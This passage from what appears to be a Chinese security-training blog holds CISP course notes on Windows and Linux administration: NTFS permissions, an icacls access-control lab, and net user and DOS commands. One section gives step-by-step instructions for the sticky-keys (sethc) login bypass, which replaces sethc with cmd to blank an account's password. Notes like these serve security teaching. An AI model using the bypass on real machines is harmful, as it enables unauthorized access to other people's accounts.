如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；</p><p>cc&#x2F;dd：如果dd禁用了继承，并修改权限；cc没有禁用继承，dd的权限保持不变；</p><p>17、当一个用户同时有两权限（即同时属于两个组：分别读取和写入），不冲突时，该用户的权限是？</p><p>可读可写</p><p>18、用户在组A允许写入，在组B拒绝写入，那么该用户是否可以在某文件中进行写入？</p><p>不可以，拒绝优先</p><p>19、windows系统中默认管理员账号是？</p><p>Administrator</p><p>20、windows中最高权限账户是？</p><p>SYSTEM</p><p>21、设置一个正确的“密码策略”（任意设置，合理即可）</p><p>最小密码长度：6位</p><p>密码最短使用期限：0</p><p>强制密码历史：3</p><p>密码最长使用期限：42</p><p>22、设置一个正确的“账户锁定策略”（任意设置，合理即可）</p><p>账户锁定时间：30分钟</p><p>账户锁定阈值：3次</p><p>重置账户锁定计数器：10分钟内</p><p>23、本地组策略的运行命令？</p><p>gpedit.msc</p><hr><h2 id="03Windows访问控制列表配置实验"><a href="#03Windows访问控制列表配置实验" class="headerlink" title="03Windows访问控制列表配置实验"></a>03Windows访问控制列表配置实验</h2><h3 id="1、实验要求"><a href="#1、实验要求" class="headerlink" title="1、实验要求"></a><strong>1、实验要求</strong></h3><p>（1）所有部门的员工智能进入本部门文件夹和public（公共类区域）</p><p>（2）每个部门的部门经理对部门有写入权限，部门员工只能读取</p><p>（3）总经理可以参与所有的部门，也可以完全控制</p><p>（4）public文件夹，所有员工可以读取，经理可以写入</p><h3 id="2、实验分析"><a href="#2、实验分析" class="headerlink" title="2、实验分析"></a><strong>2、实验分析</strong></h3><p>成员角色：</p><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>技术部：技术经理、技术员工<span class="hljs-bullet">- </span>财务部：财务经理、财务员工<span class="hljs-bullet">- </span>销售部：销售经理、销售员工<span class="hljs-bullet">- </span>经理：总经理、销售经理、技术经理、财务经理复制代码</code></pre><p>访问规则：</p><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span>文件夹访问规则：总经理、技术经理、财务经理、销售经理具有完全读写、修改权限；技术部员工、财务部员工、销售部员工只能查看。jishubu文件夹访问规则：总经理、技术经理具有完全读写、修改权限；技术部员工仅具有查看权限caiwubu文件夹访问规则：总经理、财务经理具有完全读写、修改权限；财务部员工仅具有查看权限xiaoshoubu文件夹访问规则：总经理、销售经理具有完全读写复制代码</code></pre><p>文件夹权限设置：</p><pre><code class="hljs asciidoc">方便起见，文件创建在D:\之下！！<span class="hljs-bullet">- </span>public：经理组读写权限、技术部可读权限、财务部可读权限、销售部可读权限<span class="hljs-bullet">- </span>jishubu：技术部组可读权限、技术经理读写权限、总经理读写权限<span class="hljs-bullet">- </span>caiwubu：财务部组可读权限、财务经理读写权限、总经理读写权限<span class="hljs-bullet">- </span>xiaoshoubu：销售部组可读权限、销售经理读写权限、总经理读写权限复制代码</code></pre><h3 id="3、实验步骤"><a href="#3、实验步骤" class="headerlink" title="3、实验步骤"></a><strong>3、实验步骤</strong></h3><p><strong>（1）命令创建用户、组并将用户划分到指定的组中</strong></p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建组</span>net localgroup jishubu /addnet localgroup caiwubu /addnet localgroup xiaoshoubu /addnet localgroup jingli /addlanguage-shell复制代码</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823140438226.png" alt="创建组"></p><p>创建组</p><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户</span>net user jishubujl 123.com /addnet user jishubuyg 123.com /addnet user caiwubujl 123.com /addnet user caiwubuyg 123.com /addnet user xiaoshoubujl 123.com /addnet user xiaoshoubuyg 123.com /addnet user zongjingli 123.com /add</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823140755381.png" alt="创建用户"></p><p>创建用户</p><pre><code class="hljs bash"><span class="hljs-comment"># 划分用户到组中</span>net localgroup jishubu jishubujl /addnet localgroup jishubu jishubuyg /addnet localgroup caiwubu caiwubujl /addnet localgroup caiwubu caiwubuyg /addnet localgroup xiaoshoubu xiaoshoubujl /addnet localgroup xiaoshoubu xiaoshoubuyg /addnet localgroup jingli zongjingli /addnet localgroup jingli jishubujl /addnet localgroup jingli caiwubujl /addnet localgroup jingli xiaoshoubujl /add</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823141029076.png" alt="用户添加到组中"></p><p>用户添加到组中</p><p><strong>（2）设置public文件夹权限</strong></p><p> 打开属性界面在【安全】的【高级属性】界面中取消【继承权限】，再删除无用组，添加目的组或用户，并设置相关权限。</p><p><strong>（3）设置jishubu文件权限</strong></p><p> 打开属性界面在【安全】的【高级属性】界面中取消【继承权限】，再删除无用组，添加目的组或用户，并设置相关权限。</p><p><strong>（4）设置caiwubu文件权限</strong></p><p> 打开属性界面在【安全】的【高级属性】界面中取消【继承权限】，再删除无用组，添加目的组或用户，并设置相关权限。</p><p><strong>（5）设置xiaoshoubu文件权限</strong></p><p> 打开属性界面在【安全】的【高级属性】界面中取消【继承权限】，再删除无用组，添加目的组或用户，并设置相关权限。</p><pre><code class="hljs bash"><span class="hljs-comment"># 切换到D盘</span><span class="hljs-built_in">cd</span> /d D:<span class="hljs-comment"># 创建public jishubu caiwubu xiaoshoubu 四个目录</span>md public jishubu caiwubu xiaoshoubu<span class="hljs-comment"># 禁用继承并保留现有权限：icacls &quot;目录路径&quot; /inheritance:r</span><span class="hljs-comment"># 权限控制：禁用继承后，可通过 /grant 或 /deny 添加新权限，</span><span class="hljs-comment"># 如果需要让权限应用到目录下的所有子目录和文件，添加 /T 参数：</span>icacls <span class="hljs-string">&quot;public&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;mz&quot;</span>:(F)  /Ticacls <span class="hljs-string">&quot;public&quot;</span> /grant <span class="hljs-string">&quot;jingli&quot;</span>:(M) /grant <span class="hljs-string">&quot;jishubu&quot;</span>:(R) /grant <span class="hljs-string">&quot;caiwubu&quot;</span>:(R) /grant <span class="hljs-string">&quot;xiaoshoubu&quot;</span>:(R)/Ticacls <span class="hljs-string">&quot;jishubu&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;mz&quot;</span>:(F)  /Ticacls <span class="hljs-string">&quot;jishubu&quot;</span> /grant <span class="hljs-string">&quot;zongjingli&quot;</span>:(M) /grant <span class="hljs-string">&quot;jishubujl&quot;</span>:(M) /grant <span class="hljs-string">&quot;jishubuyg&quot;</span>:(R)  /Ticacls <span class="hljs-string">&quot;caiwubu&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;mz&quot;</span>:(F)  /Ticacls <span class="hljs-string">&quot;caiwubu&quot;</span> /grant <span class="hljs-string">&quot;zongjingli&quot;</span>:(M) /grant <span class="hljs-string">&quot;caiwubujl&quot;</span>:(M) /grant <span class="hljs-string">&quot;caiwubuyg&quot;</span>:(R)  /Ticacls <span class="hljs-string">&quot;xiaoshoubu&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;mz&quot;</span>:(F)  /Ticacls <span class="hljs-string">&quot;xiaoshoubu&quot;</span> /grant <span class="hljs-string">&quot;zongjingli&quot;</span>:(M) /grant <span class="hljs-string">&quot;xiaoshoubujl&quot;</span>:(M) /grant <span class="hljs-string">&quot;xiaoshoubuyg&quot;</span>:(R)  /T<span class="hljs-comment"># 不保留MZ管理员权限的情况下</span>icacls <span class="hljs-string">&quot;public&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;jinli&quot;</span>:(F) /grant <span class="hljs-string">&quot;jishubu&quot;</span>:(R) /grant <span class="hljs-string">&quot;caiwubu&quot;</span>:(R) /grant <span class="hljs-string">&quot;xiaoshoubu&quot;</span>:(R)  /Ticacls <span class="hljs-string">&quot;jishubu&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;zongjingli&quot;</span>:(F) /grant <span class="hljs-string">&quot;jishubujl&quot;</span>:(F) /grant <span class="hljs-string">&quot;jishubuyg&quot;</span>:(R)  /Ticacls <span class="hljs-string">&quot;caiwubu&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;zongjingli&quot;</span>:(F) /grant <span class="hljs-string">&quot;caiwubujl&quot;</span>:(F) /grant <span class="hljs-string">&quot;caiwubuyg&quot;</span>:(R) /Ticacls <span class="hljs-string">&quot;xiaoshoubu&quot;</span> /inheritance:r /grant <span class="hljs-string">&quot;zongjingli&quot;</span>:(F) /grant <span class="hljs-string">&quot;xiaoshoubujl&quot;</span>:(F) /grant <span class="hljs-string">&quot;xiaoshoubuyg&quot;</span>:(R)  /T</code></pre><p>保留MZ管理员情况下</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823151835816.png" alt="保留MZ管理员权限"></p><p>保留MZ管理员权限</p><p>不保留MZ管理员的情况下</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823150125799.png" alt="创建目录和设置权限1"></p><p>创建目录和设置权限1</p><h3 id="4、实验结果验证"><a href="#4、实验结果验证" class="headerlink" title="4、实验结果验证"></a><strong>4、实验结果验证</strong></h3><p>（1）切换caiwubujl用户登录并查看对caiwubu文件夹的访问权限</p><p>（2）caiwubujl用户访问jishubu文件夹</p><p>（3）caiwubujl操作public文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823152900701.png" alt="caiwubujl权限"></p><p>caiwubujl权限</p><p>（4）切换caiwubuyg用户访问caiwubu文件夹</p><p>（5）caiwubuyg用户访问jishubu文件夹</p><p>（6）caiwubuyg用户访问public文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823153521457.png" alt="caiwubuyg权限"></p><p>caiwubuyg权限</p><p>（7）切换zongjingli用户访问caiwubu文件夹</p><p>（8）zongjingli用户访问jishubu文件夹</p><p>（9）zongjingli用户访问public文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823154407316.png" alt="zongjingli权限"></p><p>zongjingli权限</p><h3 id="5、实验总结"><a href="#5、实验总结" class="headerlink" title="5、实验总结"></a><strong>5、实验总结</strong></h3><p>对于文件或文件夹权限设置步骤：</p><p>（1）确定文件夹的类型（各个用户对该文件夹的访问权限）</p><p>（2）确定用户组，将用户划分到组中（需要整体考虑文件数量、扩展性等）</p><p>（3）创建用户、组</p><p>（4）将用户划分到组中</p><p>（5）分别为每个文件夹分配权限</p><p>（6）登录不同账户验证权限设置效果</p><h3 id="6、收尾"><a href="#6、收尾" class="headerlink" title="6、收尾"></a><strong>6、收尾</strong></h3><p>（1）删除目录</p><pre><code class="hljs bash">rd /s/q public jishubu xiaoshoubu caiwubu</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823154606668.png" alt="img"></p><p>（2）删除用户</p><pre><code class="hljs shell">net user jishubujl /delnet user jishubuyg /delnet user caiwubujl /delnet user caiwubuyg /delnet user xiaoshoubujl /delnet user xiaoshoubuyg /delnet user zongjingli /dellanguage-shell复制代码</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823154753437.png" alt="删除用户"></p><p>删除用户</p><p>（3）删除组</p><pre><code class="hljs bash">net localgroup jishubu /delnet localgroup caiwubu /delnet localgroup xiaoshoubu /delnet localgroup jingli /del</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823154820352.png" alt="删除组"></p><p>删除组</p><hr><h2 id="cisp-practice04"><a href="#cisp-practice04" class="headerlink" title="cisp-practice04"></a>cisp-practice04</h2><h3 id="1、在root家目录中创建test目录，并查看目录是否创建成功"><a href="#1、在root家目录中创建test目录，并查看目录是否创建成功" class="headerlink" title="1、在root家目录中创建test目录，并查看目录是否创建成功"></a>1、在root家目录中创建test目录，并查看目录是否创建成功</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826085810966.png" alt="img"></p><h3 id="2、在test目录中创建目录树a-b-c-d，并查看目录是否创建成功"><a href="#2、在test目录中创建目录树a-b-c-d，并查看目录是否创建成功" class="headerlink" title="2、在test目录中创建目录树a\b\c\d，并查看目录是否创建成功"></a>2、在test目录中创建目录树a\b\c\d，并查看目录是否创建成功</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826085935747.png" alt="img"></p><h3 id="3、在d目录中创建文件a-txt-b-txt-c-txt，并查看文件是否创建成功"><a href="#3、在d目录中创建文件a-txt-b-txt-c-txt，并查看文件是否创建成功" class="headerlink" title="3、在d目录中创建文件a.txt b.txt c.txt，并查看文件是否创建成功"></a>3、在d目录中创建文件a.txt b.txt c.txt，并查看文件是否创建成功</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826090158618.png" alt="img"></p><h3 id="4、在-a-txt-b-txt-c-txt-中分别写入-woshishui-wozaina-wolaile-并查看是否写入成功"><a href="#4、在-a-txt-b-txt-c-txt-中分别写入-woshishui-wozaina-wolaile-并查看是否写入成功" class="headerlink" title="4、在 a.txt b.txt c.txt 中分别写入 woshishui wozaina wolaile 并查看是否写入成功"></a>4、在 a.txt b.txt c.txt 中分别写入 woshishui wozaina wolaile 并查看是否写入成功</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826090614769.png" alt="img"></p><h3 id="5、将所有的文件复制到test目录下"><a href="#5、将所有的文件复制到test目录下" class="headerlink" title="5、将所有的文件复制到test目录下"></a>5、将所有的文件复制到test目录下</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826090726968.png" alt="img"></p><h3 id="6、将-c-txt-移动到root家目录下，并改名为cc-txt"><a href="#6、将-c-txt-移动到root家目录下，并改名为cc-txt" class="headerlink" title="6、将 c.txt 移动到root家目录下，并改名为cc.txt"></a>6、将 c.txt 移动到root家目录下，并改名为cc.txt</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826090848807.png" alt="img"></p><h3 id="7、将-a-txt-b-txt-cc-txt-文件内容合并到-root-家目录下的-d-txt"><a href="#7、将-a-txt-b-txt-cc-txt-文件内容合并到-root-家目录下的-d-txt" class="headerlink" title="7、将 a.txt b.txt cc.txt 文件内容合并到 root 家目录下的 d.txt"></a>7、将 a.txt b.txt cc.txt 文件内容合并到 root 家目录下的 d.txt</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826091213188.png" alt="img"></p><h3 id="8、将-b-目录复制到-root-家目录下"><a href="#8、将-b-目录复制到-root-家目录下" class="headerlink" title="8、将 b 目录复制到 root 家目录下"></a>8、将 b 目录复制到 root 家目录下</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826091302102.png" alt="img"></p><h3 id="9、查找-下面的所有-txt文件筛选出-d-txt"><a href="#9、查找-下面的所有-txt文件筛选出-d-txt" class="headerlink" title="9、查找 &#x2F; 下面的所有.txt文件筛选出 d.txt"></a>9、查找 &#x2F; 下面的所有.txt文件筛选出 d.txt</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826091810076.png" alt="img"></p><h3 id="10、删除所有新建的目录和文件"><a href="#10、删除所有新建的目录和文件" class="headerlink" title="10、删除所有新建的目录和文件"></a>10、删除所有新建的目录和文件</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826091900888.png" alt="img"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISP-PTE</title>
      <link href="/2025/08/17/CISP-PTE/"/>
      <url>/2025/08/17/CISP-PTE/</url>
      
        <content type="html"><![CDATA[<h1 id="培训"><a href="#培训" class="headerlink" title="培训"></a>培训</h1><h2 id="第一天-开班准备"><a href="#第一天-开班准备" class="headerlink" title="第一天 开班准备"></a>第一天 开班准备</h2><h3 id="学习寄语"><a href="#学习寄语" class="headerlink" title="学习寄语"></a>学习寄语</h3><pre><code class="hljs 1c"><span class="hljs-meta"># 班主任：大麦老师；助教老师：陈老师；培训对接老师：魏老师</span><span class="hljs-meta"># 王老师</span>学习：勤学多练，要理解不要背，有的放矢，有问题尽量当天解决，要求<span class="hljs-number">1</span>：（C）当前老师上课的实操要全部跟着操作完；（B）课后要熟练上课的实操内容；（A）做到举一反三要求<span class="hljs-number">2</span>：当天作业尽量当天交，考勤要注意<span class="hljs-meta"># 张老师（第一阶段教学）</span>课程：系统（Windows<span class="hljs-meta">&amp;Linux），网络，开发</span><span class="hljs-meta"># 肖老师（第二阶段教学）</span>课程：<span class="hljs-meta"># 叶老师（第三阶段教学）</span>课程：安全产品、安全服务，等保测评，安全加固，应急响应流程，防火墙，WAF，态势感知，堡垒机，企业如何使用安全产品保护IT资产，<span class="hljs-meta"># 上课制度</span>课程时长：学习四个月（<span class="hljs-number">3</span><span class="hljs-punctuation">-</span><span class="hljs-number">4</span>阶段考核）上课时间：周一到周五，上午<span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">-</span><span class="hljs-number">12</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span>，下午<span class="hljs-number">14</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">-</span><span class="hljs-number">18</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span>，晚上<span class="hljs-number">18</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">-</span><span class="hljs-number">22</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span>（自习时间）<span class="hljs-meta"># 韩老师-就业老师</span>岗位，未来规划<span class="hljs-meta"># 小白老师-学习方法</span>雷锋精神：无私奉献（开源），坚持，有底线多向老师请教，<span class="hljs-meta"># 陈老师-助教老师</span>看完要多练习，根据理解去学习，可以加上自己的理解去做<span class="hljs-meta"># 大麦班主任-学习方法</span>多学多问，复制代码</code></pre><h3 id="资料下载"><a href="#资料下载" class="headerlink" title="资料下载"></a>资料下载</h3><pre><code class="hljs">镜像：工具：复制代码</code></pre><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>Windows非家庭版安装&amp;激活</p><p>VMware安装&amp;配置</p><p>VPN工具安装&amp;配置</p><p>FTP工具安装&amp;配置</p><h2 id="第二天-桌面虚拟环境"><a href="#第二天-桌面虚拟环境" class="headerlink" title="第二天 桌面虚拟环境"></a>第二天 桌面虚拟环境</h2><h3 id="Windows7"><a href="#Windows7" class="headerlink" title="Windows7"></a>Windows7</h3><pre><code class="hljs bash"><span class="hljs-comment"># VM16pro，安装系统2C4G60G，删除打印机，工作网络，稍后提示，mz/aa</span>Windows7 企业版<span class="hljs-comment"># 安装VM Tools工具的补丁</span>windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu<span class="hljs-comment"># 禁用 Windows update</span>services.msc启动类型：禁用；恢复：无操作<span class="hljs-comment"># 关闭 配置自动更新</span>gpedit.msc管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）<span class="hljs-comment"># 关闭防火墙</span>控制面板\系统和安全\Windows 防火墙\自定义设置<span class="hljs-comment"># 压缩出一个D盘30G左右</span><span class="hljs-comment"># 克隆多一台WIn7虚拟机，并修改主机名mz-PC2</span></code></pre><h3 id="WinServer2019"><a href="#WinServer2019" class="headerlink" title="WinServer2019"></a>WinServer2019</h3><pre><code class="hljs bash"><span class="hljs-comment"># 桌面体验版，30G系统盘，aA1234</span>D潘<span class="hljs-comment"># 桌面优化</span>图标<span class="hljs-comment"># VMTools</span>安装 VMTools<span class="hljs-comment"># 关闭防火墙</span>控制面板\系统和安全\Windows 防火墙\自定义设置<span class="hljs-comment"># 关闭更新</span>gpedit.msc管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）<span class="hljs-comment"># 无须按 Ctrl + Alt + Del交互式登录</span>gpedit.msc &gt; Windows设置 &gt; 安全设置 &gt; 本地策略 &gt; 安全选项 &gt; 交互式登陆：无须按Ctrl + Alt + Del （已启用）<span class="hljs-comment"># 快照</span><span class="hljs-comment"># 克隆&amp;修改主机名</span></code></pre><h3 id="VM网络模式"><a href="#VM网络模式" class="headerlink" title="VM网络模式"></a>VM网络模式</h3><pre><code class="hljs routeros">桥接<span class="hljs-built_in"></span><span class="hljs-built_in">NAT</span><span class="hljs-built_in"></span>仅主机模式复制代码</code></pre><h3 id="Dos命令"><a href="#Dos命令" class="headerlink" title="Dos命令"></a>Dos命令</h3><pre><code class="hljs bash"><span class="hljs-comment">### help = command /?</span><span class="hljs-comment"># 修改字体颜色</span>color 0a<span class="hljs-comment">## dir</span><span class="hljs-comment"># 查看当前目录文件</span><span class="hljs-built_in">dir</span><span class="hljs-comment"># 只显示名字</span><span class="hljs-built_in">dir</span> /w<span class="hljs-comment"># 显示当前目录和子目录的所以文件</span><span class="hljs-built_in">dir</span> /s<span class="hljs-comment"># 显示当前目录和子目录的所以文件 / 翻页</span>dis /s/p<span class="hljs-comment"># 查看隐藏文件</span><span class="hljs-built_in">dir</span> /a<span class="hljs-comment"># 模糊查询, ?代表一个单词</span><span class="hljs-built_in">dir</span> de?ktop<span class="hljs-comment"># 模糊查询2，*代表多个单词</span><span class="hljs-built_in">dir</span> d*<span class="hljs-comment"># 模糊查询3，空格需要要&quot;&quot;包裹</span><span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;desk top&quot;</span><span class="hljs-comment">## cd</span><span class="hljs-comment"># 进入目录, cd [.|..|path]</span><span class="hljs-built_in">cd</span> path<span class="hljs-comment"># 返回盘符目录，即根目录</span><span class="hljs-built_in">cd</span> /<span class="hljs-comment"># 直接跨盘符调整指定目录            --todo     在D盘如何直接跨盘调整到C指定目录--</span><span class="hljs-built_in">cd</span> /d [盘符]<span class="hljs-comment">## md 创建目录</span><span class="hljs-comment"># 创建单层目录</span>md <span class="hljs-built_in">test</span><span class="hljs-comment"># 创建多层目录</span>md a/b/c<span class="hljs-comment">## cd&gt; 创建文件</span><span class="hljs-comment"># 创建aa.txt文件</span><span class="hljs-built_in">cd</span>&gt; aa.txt<span class="hljs-comment"># 在a路径下创建aa.txt文件</span><span class="hljs-built_in">cd</span>&gt; a\aa.txt<span class="hljs-comment">## echo 编写内容</span><span class="hljs-comment"># 往aa.txt文件覆盖写入内容whoami</span><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt; aa.txt<span class="hljs-comment"># 往aa.txt文件追加写入内容whoami</span><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt;&gt; aa.txt<span class="hljs-comment"># 往a目录下的aa.txt文件覆盖写入内容whoami</span><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt; a\aa.txt<span class="hljs-comment">## type 查看文件内容</span><span class="hljs-comment"># 查看aa.txt文件内容</span><span class="hljs-built_in">type</span> aa.txt<span class="hljs-comment">## copy 复制文件</span><span class="hljs-comment"># 将aa.txt文件拷贝到test目录中</span>copy aa.txt <span class="hljs-built_in">test</span><span class="hljs-comment"># 拷贝test目录下的aa.txt文件到根目录并修改为bb.txt文件</span>copy <span class="hljs-built_in">test</span>\aa.txt bb.txt<span class="hljs-comment">## ren 修改文件名称</span><span class="hljs-comment"># 将 bb.txt 修改为 cc.txt</span>ren bb.txt cc.txt<span class="hljs-comment"># 将test目录下的aa.txt 修改为bb.txt [后面不需要指定目录]</span>ren <span class="hljs-built_in">test</span>\aa.txt bb.txt<span class="hljs-comment">## rd 删除目录</span><span class="hljs-comment"># 删除 test目录[需要确认]</span>rd /s <span class="hljs-built_in">test</span><span class="hljs-comment"># 确定删除test目录</span>rd /s/q <span class="hljs-built_in">test</span><span class="hljs-comment">## del 删除文件</span><span class="hljs-comment"># 删除 aa.txt 文件</span>del aa.txt<span class="hljs-comment">### 其他</span><span class="hljs-comment">## cls 清屏</span><span class="hljs-comment">## ver 查看当前dos版本</span><span class="hljs-comment">## chkdsk 检查当前磁盘，chkdsk d: 检查D盘</span><span class="hljs-comment">## time 显示时间</span><span class="hljs-comment">## date 显示日期</span><span class="hljs-comment">## certmgr 证书管理窗口</span><span class="hljs-comment">## mstsc 打开远程窗口</span><span class="hljs-comment">## explorer 文件管理器</span><span class="hljs-comment">## calc 计时器工具</span><span class="hljs-comment">## cleanmgr 磁盘清理工具</span><span class="hljs-comment">## gpedit 本地组策略编辑器</span><span class="hljs-comment">## lusrmgr 本地用户和组</span><span class="hljs-comment">## notepad 打开记事本</span><span class="hljs-comment">## regedit 注册表</span><span class="hljs-comment">## sfc 检查文件， sfc /SCANNOW </span><span class="hljs-comment">## taskmgr 任务管理器</span><span class="hljs-comment">## write 写字板</span><span class="hljs-comment">## help 查看有什么命令</span><span class="hljs-comment">## ipconfig 查看IP地址</span>ipconfigipconfig /all<span class="hljs-comment">## nslookup 查看DNS解析</span>nslookup baidu.com<span class="hljs-comment">## ping 默认ping 4次</span>ping baidu.com -t <span class="hljs-comment"># 一直ping</span>ping baidu.com -n 10 <span class="hljs-comment"># ping 10 次</span>ping baidu.com -l 1464 <span class="hljs-comment"># 指定ping包大小为10字节 [有些网站现在ping包大小]</span></code></pre><h3 id="cisp-practise01"><a href="#cisp-practise01" class="headerlink" title="cisp-practise01"></a><a href="https://hjxstart.github.io/2025/08/21/cisp-practice01/">cisp-practise01</a></h3><h2 id="第三天-Windows"><a href="#第三天-Windows" class="headerlink" title="第三天 Windows"></a>第三天 Windows</h2><pre><code class="hljs gradle">Windowe系统格式：CDFS<span class="hljs-regexp">/UDF/</span>FAT12<span class="hljs-regexp">/FAT16/</span>FAT32/NTFSNTFS (<span class="hljs-keyword">New</span> Technology <span class="hljs-keyword">File</span> System 新技术文件系统)复制代码</code></pre><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><pre><code class="hljs bash">默认继承权限；可以通过禁用继承，修改权限和主体；aa/bb: 如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；cc/dd：如果<span class="hljs-built_in">dd</span>禁用了继承，并修改权限；cc没有禁用继承，<span class="hljs-built_in">dd</span>的权限保持不变；复制代码</code></pre><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><pre><code class="hljs bash"><span class="hljs-comment"># Win7密码保存地址：C:\Windows\System32\config\SAM；hash加密了</span>0、账号的编号Administrator500Guest5011、查看用户<span class="hljs-built_in">whoami</span> /user <span class="hljs-comment"># 查看当前用户</span>vmic useraccount get name,sid <span class="hljs-comment"># 查看所以账号的名称和sid</span>net user  <span class="hljs-comment"># 查看所有用户</span>net user admin <span class="hljs-comment"># 查看admin用户信息</span>2、启用或禁用指定用户net user admin /active:<span class="hljs-built_in">yes</span> <span class="hljs-comment"># 启用admin用户</span>net user admin /active:no <span class="hljs-comment">#  禁用admin用户</span>3、命令创建用户net user mz aa123456 /add  <span class="hljs-comment"># 创建用户mz 密码为aa123456</span>4、命令重置用户密码net user mz <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 将mz用户密码重置为空</span>5、修改用户密码net user mz 123456 <span class="hljs-comment"># 将mz用户的密码修改为123456</span>6、命令删除用户net user mz /del <span class="hljs-comment"># 删除mz用户</span></code></pre><h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><pre><code class="hljs bash"><span class="hljs-comment"># 组：Guest、Users</span>1、查看组net localgroup <span class="hljs-comment"># 查看本地用户组</span>2、命令创建组net localgroup group1 /add <span class="hljs-comment"># 创建group1组</span>3、命令删除组net localgroup group1 /del <span class="hljs-comment"># 删除group1组</span>4、命令添加用户到指定组net localgroup group1 mz /add <span class="hljs-comment"># 将用户mz加入group1组</span>5、把指定用户踢出组net localgroup group1 mz /del <span class="hljs-comment"># 将用户mz移出group1组</span></code></pre><h3 id="5次shift漏洞"><a href="#5次shift漏洞" class="headerlink" title="5次shift漏洞"></a>5次shift漏洞</h3><pre><code class="hljs bash"><span class="hljs-comment"># 唤醒程序路径：C:\Windows\System32\sethc</span><span class="hljs-comment"># 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件&gt;打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username &quot;&quot;，设置无密码即可登录。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114649243.png" alt="sethc"></p><p>sethc</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114952907.png" alt="5次shift漏洞"></p><p>5次shift漏洞</p><h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3><pre><code class="hljs 1c">gpedit.msc &gt; Windows设置 &gt; 账号策略 &gt; 密码策略 （密码长度，复杂性，默认（密码最长使用时间<span class="hljs-number">42</span>天，最短<span class="hljs-number">0</span>天），强制密码历史次数）gpedit.msc &gt; Windows设置 &gt; 账号策略 &gt; 账号锁定策略 （锁定时间，锁定阈值：<span class="hljs-number">3</span>次无效登录，重置锁定计数器）<span class="hljs-meta"># 本地日志 （使用事件查看器，eventvwr.msc）</span>gpedit.msc &gt; Windows设置 &gt; 本地策略 （登录记录，系统时间等）复制代码</code></pre><h3 id="Windows隐藏账号"><a href="#Windows隐藏账号" class="headerlink" title="Windows隐藏账号"></a>Windows隐藏账号</h3><pre><code 